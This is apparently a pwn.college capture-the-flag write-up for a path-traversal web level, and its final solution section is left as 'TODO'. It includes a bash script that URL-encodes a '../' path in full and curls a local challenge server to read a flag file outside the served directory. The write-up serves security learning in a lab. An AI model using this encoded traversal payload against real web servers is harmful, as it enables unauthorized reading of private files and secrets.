# [Path Traversal 2](https://pwn.college/intro-to-cybersecurity/web-security/#challenges-header-2)

## Problem

This level tries to stop you from traversing the path, but does it in a way that clearly demonstrates a further lack of the developer's understanding of how tricky paths can truly be. Can you still traverse it?

This level will explore the intersection of Linux path resolution, when done naively, and unexpected web requests from an attacker. We've implemented a simple web server for you --- it will serve up files from /challenge/files over HTTP. Can you trick it into giving you the flag?

The webserver program is `/challenge/server`. You can run it just like any other challenge, then talk to it over HTTP (using a different terminal or a web browser). We recommend reading through its code to understand what it is doing and to find the weakness!

## Steps

After running the server script we see that the server is being served from `http://challenge.localhost:80`. When we attempt to make a curl to the the web root we are greated with the index.html page. We attempt to perform simple directory transversal using `curl http://challenge.localhost:80/../../flag` but fail to get a flag. We then encode our attempt using bash commands and are able to get a flag

### solution.sh

```bash
# Performing URL Encoding
path_to_encode="fortunes/../../../flag"
url_encoded_path=$(echo -n "$path_to_encode" | xxd -plain | tr -d '\n' | sed 's/\(..\)/%\1/g')
curl -v "http://challenge.localhost:80/content/$url_encoded_path"
```

## Solution

TODO
